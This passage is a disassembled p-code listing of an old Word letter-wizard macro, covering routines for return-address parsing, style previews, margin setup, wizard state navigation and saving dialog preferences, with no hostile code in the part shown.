' 	Ld kStyCmpnyName$ 
' 	Ld WordBasic 
' 	ArgsMemCall Style 0x0001 
' Line #915:
' 	ElseBlock 
' Line #916:
' 	Ld WordBasic 
' 	ArgsMemCall InsertPara 0x0000 
' Line #917:
' 	EndIfBlock 
' 	QuoteRem 0x0013 0x000A "Wizstyle=1"
' Line #918:
' 	Ld kStyRetAddr$ 
' 	Ld WordBasic 
' 	ArgsMemCall Style 0x0001 
' Line #919:
' 	ArgsCall ParseRetAddress 0x0000 
' Line #920:
' 	LitStr 0x0008 "WizStyle"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0002 
' 	Ne 
' 	Paren 
' 	IfBlock 
' 	QuoteRem 0x003A 0x0018 " Cntmp or Prof let style"
' Line #921:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	For 
' Line #922:
' 	Ld ii 
' 	ArgsLd RetAddress__$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #923:
' 	Ld ii 
' 	ArgsLd RetAddress__$ 0x0001 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #924:
' 	ElseBlock 
' Line #925:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #926:
' 	EndIfBlock 
' 	QuoteRem 0x001B 0x000D "RetAddress..."
' Line #927:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #928:
' 	LitDI2 0x0004 
' 	ArgsLd RetAddress__$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0004 
' 	ArgsLd RetAddress__$ 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' 	EndIf 
' Line #929:
' 	ElseBlock 
' 	QuoteRem 0x0011 0x000D "elegant style"
' Line #930:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	For 
' Line #931:
' 	Ld ii 
' 	ArgsLd RetAddress__$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #932:
' 	Ld ii 
' 	ArgsLd RetAddress__$ 0x0001 
' 	LitStr 0x0004 " ¡E "
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #933:
' 	ElseBlock 
' Line #934:
' 	QuoteRem 0x0018 0x000A "Do Nothing"
' Line #935:
' 	EndIfBlock 
' 	QuoteRem 0x001B 0x000D "RetAddress..."
' Line #936:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #937:
' 	LitDI2 0x0004 
' 	ArgsLd RetAddress__$ 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #938:
' 	LitDI2 0x0004 
' 	ArgsLd RetAddress__$ 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #939:
' 	ElseBlock 
' Line #940:
' 	LitDI2 0x0003 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall WW6_EditClear 0x0001 
' 	QuoteRem 0x002F 0x0016 "get rid of last bullet"
' Line #941:
' 	EndIfBlock 
' Line #942:
' 	EndIfBlock 
' Line #943:
' 	EndIfBlock 
' 	QuoteRem 0x000F 0x000A "LetterHead"
' Line #944:
' 	EndIfBlock 
' 	QuoteRem 0x000B 0x000B "NotPersonal"
' Line #945:
' 	LitStr 0x0009 "chkloDate"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #946:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #947:
' 	Ld kStyDate$ 
' 	Ld WordBasic 
' 	ArgsMemCall Style 0x0001 
' Line #948:
' 	Ld kFormalDateFormat$ 
' 	Ld WordBasic 
' 	ArgsMemCall InsertDateTime 0x0001 
' Line #949:
' 	EndIfBlock 
' Line #950:
' 	Label LPrewrittenContinue 
' Line #951:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfDocument 0x0000 
' Line #952:
' 	Ld WordBasic 
' 	ArgsMemCall ViewPage 0x0000 
' Line #953:
' 	LitDI2 0x0001 
' 	ParamNamed AutoFit 
' 	Ld WordBasic 
' 	ArgsMemCall ViewZoom 0x0001 
' Line #954:
' 	LitDI2 0x000B 
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall CharRight 0x0002 
' 	EndIf 
' 	QuoteRem 0x0040 0x0013 "select Company Name"
' Line #955:
' 	EndSub 
' Line #956:
' Line #957:
' 	FuncDefn (Private Sub PickStylePreview())
' Line #958:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfDocument 0x0000 
' Line #959:
' 	Ld WordBasic 
' 	ArgsMemCall EditSelectAll 0x0000 
' Line #960:
' 	Ld WordBasic 
' 	ArgsMemCall WW6_EditClear 0x0000 
' Line #961:
' 	ArgsCall DoStyleMerge 0x0000 
' Line #962:
' 	LitStr 0x0008 "WizStyle"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	SelectCase 
' Line #963:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #964:
' 	Ld kGallery$ 
' 	LitDI2 0x0001 
' 	ParamNamed Insert 
' 	Ld WordBasic 
' 	ArgsMemCall WW7_EditAutoText 0x0002 
' Line #965:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #966:
' 	LitStr 0x000D "UseLetterhead"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #967:
' 	LitStr 0x0009 "cntmpgfx2"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Insert 
' 	Ld WordBasic 
' 	ArgsMemCall WW7_EditAutoText 0x0002 
' Line #968:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfDocument 0x0000 
' Line #969:
' 	EndIfBlock 
' Line #970:
' 	Ld kGallery$ 
' 	LitDI2 0x0001 
' 	ParamNamed Insert 
' 	Ld WordBasic 
' 	ArgsMemCall WW7_EditAutoText 0x0002 
' Line #971:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #972:
' 	Ld kGallery$ 
' 	LitDI2 0x0001 
' 	ParamNamed Insert 
' 	Ld WordBasic 
' 	ArgsMemCall WW7_EditAutoText 0x0002 
' Line #973:
' 	EndSelect 
' Line #974:
' 	EndSub 
' Line #975:
' Line #976:
' 	FuncDefn (Private Sub DoStyleMerge())
' Line #977:
' 	Dim 
' 	VarDefn n
' Line #978:
' 	LitStr 0x0000 ""
' 	St n$ 
' Line #979:
' 	LitStr 0x0008 "WizStyle"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	SelectCase 
' Line #980:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #981:
' 	Ld proflett$ 
' 	St n$ 
' Line #982:
' 	Ld kFtrDist1$ 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed FooterDistance 
' 	Ld WordBasic 
' 	ArgsMemCall FilePageSetup 0x0001 
' Line #983:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #984:
' 	Ld cntmplet$ 
' 	St n$ 
' Line #985:
' 	Ld kFtrDist2$ 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed FooterDistance 
' 	Ld WordBasic 
' 	ArgsMemCall FilePageSetup 0x0001 
' Line #986:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #987:
' 	Ld eleglett$ 
' 	St n$ 
' Line #988:
' 	Ld kFtrDist1$ 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed FooterDistance 
' 	Ld WordBasic 
' 	ArgsMemCall FilePageSetup 0x0001 
' Line #989:
' 	EndSelect 
' Line #990:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall WaitCursor 0x0001 
' Line #991:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError LStyleMissing 
' Line #992:
' 	Ld n$ 
' 	ParamNamed Template 
' 	Ld WordBasic 
' 	ArgsMemCall FormatStyleGallery 0x0001 
' Line #993:
' 	Ld WordBasic 
' 	ArgsMemCall DlgUpdateFilePreview 0x0000 
' Line #994:
' 	GoTo LContinue1 
' Line #995:
' 	Label LStyleMissing 
' Line #996:
' 	Ld kErrStyleNotFound1$ 
' 	Ld n$ 
' 	Add 
' 	Ld kErrStyleNotFound2$ 
' 	Add 
' 	Ld wizname$ 
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #997:
' 	Label LContinue1 
' Line #998:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #999:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall WaitCursor 0x0001 
' Line #1000:
' 	EndSub 
' Line #1001:
' Line #1002:
' 	FuncDefn (Private Sub ParseRetAddress())
' Line #1003:
' 	Dim 
' 	VarDefn i
' Line #1004:
' 	Dim 
' 	VarDefn temp
' Line #1005:
' 	Dim 
' 	VarDefn iPos
' Line #1006:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0007 
' 	For 
' Line #1007:
' 	LitStr 0x0000 ""
' 	Ld i 
' 	ArgsSt RetAddress__$ 0x0001 
' Line #1008:
' 	StartForVariable 
' 	Next 
' Line #1009:
' 	LitDI2 0x0000 
' 	St i 
' Line #1010:
' 	LitStr 0x0011 "textReturnAddress"
' 	Ld WordBasic 
' 	ArgsMemLd [DlgText$] 0x0001 
' 	St temp$ 
' Line #1011:
' 	Ld temp$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #1012:
' 	Ld temp$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	St iPos 
' Line #1013:
' 	Ld iPos 
' 	Ld i 
' 	LitDI2 0x0007 
' 	Lt 
' 	Paren 
' 	And 
' 	While 
' Line #1014:
' 	Ld iPos 
' 	Ld temp$ 
' 	FnLen 
' 	Lt 
' 	IfBlock 
' Line #1015:
' 	Ld temp$ 
' 	Ld iPos 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	Ld i 
' 	ArgsSt RetAddress__$ 0x0001 
' Line #1016:
' 	Ld temp$ 
' 	Ld iPos 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	St temp$ 
' Line #1017:
' 	Ld temp$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	St iPos 
' Line #1018:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #1019:
' 	ElseBlock 
' Line #1020:
' 	Ld temp$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #1021:
' 	Ld temp$ 
' 	Ld iPos 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	Ld i 
' 	ArgsSt RetAddress__$ 0x0001 
' Line #1022:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #1023:
' 	EndIfBlock 
' Line #1024:
' 	LitStr 0x0000 ""
' 	St temp$ 
' Line #1025:
' 	LitDI2 0x0000 
' 	St iPos 
' Line #1026:
' 	EndIfBlock 
' Line #1027:
' 	Wend 
' Line #1028:
' 	Ld temp$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #1029:
' 	Ld temp$ 
' 	Ld i 
' 	ArgsSt RetAddress__$ 0x0001 
' Line #1030:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #1031:
' 	EndIfBlock 
' Line #1032:
' 	EndIfBlock 
' Line #1033:
' Line #1034:
' 	Ld i 
' 	St RetAddressLines 
' Line #1035:
' 	EndSub 
' Line #1036:
' Line #1037:
' Line #1038:
' 	QuoteRem 0x0000 0x0027 "%% NextState : Determine the next state"
' Line #1039:
' 	FuncDefn (Private Function NextState(oldState))
' 	QuoteRem 0x0028 0x0025 "Determine state that follows oldState"
' Line #1040:
' 	Dim 
' 	VarDefn LetterMethod
' Line #1041:
' 	Dim 
' 	VarDefn UseLetterhead
' Line #1042:
' 	LitDI2 0x000B 
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	St LetterMethod 
' Line #1043:
' 	LitStr 0x000D "UseLetterhead"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	St UseLetterhead 
' Line #1044:
' 	Ld oldState 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld UseLetterhead 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	Ld LetterMethod 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #1045:
' 	Ld oldState 
' 	LitDI2 0x0003 
' 	Add 
' 	St NextState 
' Line #1046:
' 	Ld oldState 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld UseLetterhead 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	ElseIfBlock 
' Line #1047:
' 	Ld oldState 
' 	LitDI2 0x0002 
' 	Add 
' 	St NextState 
' Line #1048:
' 	Ld oldState 
' 	LitDI2 0x0004 
' 	Eq 
' 	Ld LetterMethod 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #1049:
' 	Ld oldState 
' 	LitDI2 0x0002 
' 	Add 
' 	St NextState 
' Line #1050:
' 	ElseBlock 
' Line #1051:
' 	Ld oldState 
' 	LitDI2 0x0001 
' 	Add 
' 	St NextState 
' 	QuoteRem 0x0021 0x0007 "default"
' Line #1052:
' 	EndIfBlock 
' Line #1053:
' 	EndFunc 
' 	QuoteRem 0x000D 0x0009 "NextState"
' Line #1054:
' Line #1055:
' 	QuoteRem 0x0000 0x002C "%% PrevState : Determine the preceding state"
' Line #1056:
' 	FuncDefn (Private Function PrevState(oldState))
' Line #1057:
' 	Dim 
' 	VarDefn LetterMethod
' Line #1058:
' 	Dim 
' 	VarDefn UseLetterhead
' Line #1059:
' 	LitDI2 0x000B 
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	St LetterMethod 
' Line #1060:
' 	LitStr 0x000D "UseLetterhead"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	St UseLetterhead 
' Line #1061:
' 	Ld oldState 
' 	LitDI2 0x0006 
' 	Eq 
' 	Ld LetterMethod 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Ld UseLetterhead 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #1062:
' 	Ld oldState 
' 	LitDI2 0x0003 
' 	Sub 
' 	St PrevState 
' Line #1063:
' 	Ld oldState 
' 	LitDI2 0x0006 
' 	Eq 
' 	Ld LetterMethod 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #1064:
' 	Ld oldState 
' 	LitDI2 0x0002 
' 	Sub 
' 	St PrevState 
' Line #1065:
' 	Ld oldState 
' 	LitDI2 0x0005 
' 	Eq 
' 	Ld UseLetterhead 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	ElseIfBlock 
' Line #1066:
' 	Ld oldState 
' 	LitDI2 0x0002 
' 	Sub 
' 	St PrevState 
' Line #1067:
' 	ElseBlock 
' Line #1068:
' 	Ld oldState 
' 	LitDI2 0x0001 
' 	Sub 
' 	St PrevState 
' 	QuoteRem 0x0021 0x0007 "Default"
' Line #1069:
' 	EndIfBlock 
' Line #1070:
' 	EndFunc 
' 	QuoteRem 0x000D 0x0009 "PrevState"
' Line #1071:
' Line #1072:
' 	FuncDefn (Private Sub UpdateHeadingPosition())
' Line #1073:
' 	Dim 
' 	VarDefn lhpNew
' Line #1074:
' 	Dim 
' 	VarDefn L
' Line #1075:
' 	Dim 
' 	VarDefn R
' Line #1076:
' 	Dim 
' 	VarDefn T
' Line #1077:
' 	LitStr 0x0012 "LetterHeadPosition"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	St lhpNew 
' Line #1078:
' 	Ld lhpNew 
' 	Ld gCurrentHeadingPosition 
' 	Ne 
' 	IfBlock 
' Line #1079:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall WaitCursor 0x0001 
' Line #1080:
' 	Ld lhpNew 
' 	St gCurrentHeadingPosition 
' Line #1081:
' 	Ld pt90_$ 
' 	St L$ 
' 	BoS 0x0000 
' 	Ld pt90_$ 
' 	St R$ 
' 	BoS 0x0000 
' 	Ld pt72_$ 
' 	St T$ 
' Line #1082:
' 	Ld gCurrentHeadingPosition 
' 	SelectCase 
' Line #1083:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld pt216_$ 
' 	St T$ 
' Line #1084:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld pt216_$ 
' 	St L$ 
' Line #1085:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld pt216_$ 
' 	St R$ 
' Line #1086:
' 	EndSelect 
' Line #1087:
' 	Ld T$ 
' 	ParamNamed TopMargin 
' 	Ld L$ 
' 	ParamNamed LeftMargin 
' 	Ld R$ 
' 	ParamNamed RightMargin 
' 	Ld WordBasic 
' 	ArgsMemCall FilePageSetup 0x0003 
' Line #1088:
' 	ArgsCall PickStylePreview 0x0000 
' Line #1089:
' 	EndIfBlock 
' Line #1090:
' 	EndSub 
' Line #1091:
' Line #1092:
' 	QuoteRem 0x0000 0x0051 "%% DoButtonClick : Handle custom buttons (override standard buttons if necessary)"
' Line #1093:
' 	FuncDefn (Private Function DoButtonClick(id, item))
' Line #1094:
' 	Dim 
' 	VarDefn ret
' Line #1095:
' 	Dim 
' 	VarDefn letterIndex
' Line #1096:
' 	Dim 
' 	VarDefn fname
' Line #1097:
' 	Dim 
' 	VarDefn x
' Line #1098:
' 	LitDI2 0x0000 
' 	St ret 
' 	QuoteRem 0x000C 0x0042 "Change value of ret when we override standard buttons (eg, "Next")"
' Line #1099:
' 	QuoteRem 0x0004 0x0017 "Note: item 6 is "Next>""
' Line #1100:
' Line #1101:
' 	Ld State 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld item 
' 	LitDI2 0x0000 
' 	ArgsLd StateItems__ 0x0001 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #1102:
' 	LitStr 0x000D "UseLetterhead"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #1103:
' 	LitDI2 0x0045 
' 	UMi 
' 	St gCurrentHeadingPosition 
' 	QuoteRem 0x002A 0x000C "force change"
' Line #1104:
' 	ArgsCall UpdateHeadingPosition 0x0000 
' Line #1105:
' 	ElseBlock 
' Line #1106:
' 	Ld pt72_$ 
' 	ParamNamed TopMargin 
' 	Ld pt90_$ 
' 	ParamNamed LeftMargin 
' 	Ld pt90_$ 
' 	ParamNamed RightMargin 
' 	Ld WordBasic 
' 	ArgsMemCall FilePageSetup 0x0003 
' Line #1107:
' 	ArgsCall PickStylePreview 0x0000 
' 	QuoteRem 0x001D 0x0004 "TEST"
' Line #1108:
' 	EndIfBlock 
' Line #1109:
' 	Ld WordBasic 
' 	ArgsMemCall DlgUpdateFilePreview 0x0000 
' Line #1110:
' 	EndIfBlock 
' Line #1111:
' 	Ld State 
' 	LitDI2 0x0004 
' 	Eq 
' 	Ld item 
' 	LitDI2 0x0000 
' 	ArgsLd StateItems__ 0x0001 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #1112:
' 	LitStr 0x0012 "LetterHeadPosition"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	Ld gCurrentHeadingPosition 
' 	Ne 
' 	IfBlock 
' Line #1113:
' 	ArgsCall UpdateHeadingPosition 0x0000 
' Line #1114:
' 	Ld WordBasic 
' 	ArgsMemCall DlgUpdateFilePreview 0x0000 
' Line #1115:
' 	EndIfBlock 
' Line #1116:
' 	EndIfBlock 
' Line #1117:
' 	Ld State 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #1118:
' 	ArgsCall ParseRetAddress 0x0000 
' Line #1119:
' 	Ld RetAddressLines 
' 	LitDI2 0x0005 
' 	Gt 
' 	IfBlock 
' Line #1120:
' 	LitDI2 0x0002 
' 	St ret 
' Line #1121:
' 	LitStr 0x0011 "textReturnAddress"
' 	Ld WordBasic 
' 	ArgsMemCall DlgFocus 0x0001 
' Line #1122:
' 	Ld kErrMaxLines$ 
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #1123:
' 	EndIfBlock 
' 	QuoteRem 0x000F 0x000D "retaddress..."
' Line #1124:
' 	EndIfBlock 
' 	QuoteRem 0x000B 0x0009 "state = 5"
' Line #1125:
' 	Ld State 
' 	LitDI2 0x0006 
' 	Eq 
' 	Ld item 
' 	LitDI2 0x0000 
' 	ArgsLd StateItems__ 0x0001 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #1126:
' 	ArgsCall PickStylePreview 0x0000 
' Line #1127:
' 	Ld WordBasic 
' 	ArgsMemCall DlgUpdateFilePreview 0x0000 
' Line #1128:
' 	EndIfBlock 
' Line #1129:
' 	Label LContinue 
' Line #1130:
' 	Ld item 
' 	LitDI2 0x0007 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0015 0x0007 " FINISH"
' Line #1131:
' 	Ld RetAddressLines 
' 	LitDI2 0x0005 
' 	Le 
' 	IfBlock 
' Line #1132:
' 	ArgsCall CreateLetter 0x0000 
' Line #1133:
' 	LitStr 0x000E "HelpOrEnvelope"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	St x 
' Line #1134:
' 	Ld x 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	St gEnvelopeLabel 
' Line #1135:
' 	Ld dlgEL 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall ToolsEnvelopesAndLabels 0x0001 
' Line #1136:
' 	LitStr 0x0014 "textRecipientAddress"
' 	Ld WordBasic 
' 	ArgsMemLd [DlgText$] 0x0001 
' 	Ld dlgEL 
' 	MemSt EnvAddress 
' Line #1137:
' 	LitStr 0x0011 "textReturnAddress"
' 	Ld WordBasic 
' 	ArgsMemLd [DlgText$] 0x0001 
' 	Ld dlgEL 
' 	MemSt EnvReturn 
' Line #1138:
' 	LitStr 0x0014 "textRecipientAddress"
' 	Ld WordBasic 
' 	ArgsMemLd [DlgText$] 0x0001 
' 	Ld dlgEL 
' 	MemSt AddrText 
' Line #1139:
' 	LitDI2 0x0000 
' 	Ld dlgEL 
' 	MemSt ExtractAddress 
' Line #1140:
' 	LitDI2 0x0001 
' 	St ret 
' 	QuoteRem 0x0014 0x0024 " This means "return from wizard now""
' Line #1141:
' 	ElseBlock 
' Line #1142:
' 	LitDI2 0x0002 
' 	St ret 
' Line #1143:
' 	EndIfBlock 
' Line #1144:
' 	EndIfBlock 
' Line #1145:
' 	Ld ret 
' 	St DoButtonClick 
' Line #1146:
' 	EndFunc 
' 	QuoteRem 0x000D 0x000D "DoButtonClick"
' Line #1147:
' Line #1148:
' Line #1149:
' 	FuncDefn (Private Sub ItemFocusChanged(id, wold))
' Line #1150:
' 	Ld State 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #1151:
' 	Ld id$ 
' 	LitDI2 0x0005 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	LitStr 0x0005 "optlm"
' 	Eq 
' 	IfBlock 
' Line #1152:
' 	LitStr 0x0008 "tip1text"
' 	LitStr 0x0004 "tip1"
' 	Ld id$ 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [GetAutoText$] 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall DlgText 0x0002 
' Line #1153:
' 	EndIfBlock 
' Line #1154:
' 	Ld State 
' 	LitDI2 0x0004 
' 	Eq 
' 	ElseIfBlock 
' Line #1155:
' 	Ld id$ 
' 	LitDI2 0x0003 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0003 "The"
' 	Eq 
' 	IfBlock 
' Line #1156:
' 	LitStr 0x0008 "tip5text"
' 	LitStr 0x0004 "tip5"
' 	Ld id$ 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [GetAutoText$] 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall DlgText 0x0002 
' Line #1157:
' 	EndIfBlock 
' Line #1158:
' 	EndIfBlock 
' Line #1159:
' 	EndSub 
' Line #1160:
' Line #1161:
' 	FuncDefn (Private Sub SaveDialog())
' Line #1162:
' 	Ld kSaveSettings$ 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #1163:
' 	LitStr 0x000C "LetterMethod"
' 	ArgsCall SaveDlgValPref 0x0001 
' Line #1164:
' 	QuoteRem 0x0000 0x0007 "state 2"
' Line #1165:
' 	LitStr 0x0009 "chkloPage"
' 	ArgsCall SaveDlgValPref 0x0001 
' Line #1166:
' 	LitStr 0x0009 "chkloDate"
' 	ArgsCall SaveDlgValPref 0x0001 
' Line #1167:
' 	LitStr 0x0007 "chkloID"
' 	ArgsCall SaveDlgValPref 0x0001 
' Line #1168:
' 	LitStr 0x0013 "chkloWriterInitials"
' 	ArgsCall SaveDlgValPref 0x0001 
' Line #1169:
' 	LitStr 0x0013 "chkloTypistInitials"
' 	ArgsCall SaveDlgValPref 0x0001 
' Line #1170:
' 	LitStr 0x0007 "chkloCC"
' 	ArgsCall SaveDlgValPref 0x0001 
' Line #1171:
' 	LitStr 0x000F "chkloEnclosures"
' 	ArgsCall SaveDlgValPref 0x0001 
' Line #1172:
' 	LitStr 0x0010 "chkloAttachments"
' 	ArgsCall SaveDlgValPref 0x0001 
' Line #1173:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #1174:
' 	LitStr 0x000D "UseLetterhead"
' 	ArgsCall SaveDlgValPref 0x0001 
' Line #1175:
' 	QuoteRem 0x0000 0x0001 "4"
' Line #1176:
' 	LitStr 0x0012 "LetterHeadPosition"
' 	ArgsCall SaveDlgValPref 0x0001 
' Line #1177:
' 	LitStr 0x0013 "textLetterheadSpace"
' 	ArgsCall SaveDlgPref 0x0001 
' Line #1178:
' 	QuoteRem 0x0000 0x0001 "5"
' Line #1179:
' 	LitStr 0x0014 "textRecipientAddress"
' 	ArgsCall SaveDlgMultiLinePref 0x0001 
' Line #1180:
' 	LitStr 0x0011 "textReturnAddress"
' 	ArgsCall SaveDlgMultiLinePref 0x0001 
' Line #1181:
' 	QuoteRem 0x0000 0x0001 "6"
' Line #1182:
' 	LitStr 0x0008 "WizStyle"
' 	ArgsCall SaveDlgValPref 0x0001 
' Line #1183:
' 	QuoteRem 0x0000 0x0006 "finish"
' Line #1184:
' 	LitStr 0x000E "HelpOrEnvelope"
' 	ArgsCall SaveDlgValPref 0x0001 
' Line #1185:
' 	EndSub 
' Line #1186:
' Line #1187:
' 	FuncDefn (Private Sub RstDialog())
' Line #1188:
' 	Dim 
' 	VarDefn a
' Line #1189:
' 	Dim 
' 	VarDefn unit
' Line #1190:
' 	Dim 
' 	VarDefn kRstStylesheet
' Line #1191:
' 	Dim 
' 	VarDefn def
' Line #1192:
' 	Ld kRstSettings$ 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #1193:
' 	LitStr 0x000C "LetterMethod"
' 	LitDI2 0x0000 
' 	ArgsCall RstDlgValPref 0x0002 
' 	QuoteRem 0x0024 0x0017 " LetterMethod is id #11"
' Line #1194:
' 	LitStr 0x0008 "tip1text"
' 	LitStr 0x0009 "tip1optlm"
' 	LitDI2 0x000B 
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [GetAutoText$] 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall DlgText 0x0002 
' 	QuoteRem 0x0081 0x0016 "For Prewritten Letters"
' Line #1195:
' 	QuoteRem 0x0000 0x0007 "state 2"
' Line #1196:
' 	LitStr 0x0009 "chkloPage"
' 	LitDI2 0x0001 
' 	ArgsCall RstDlgValPref 0x0002 
' Line #1197:
' 	LitStr 0x0009 "chkloDate"
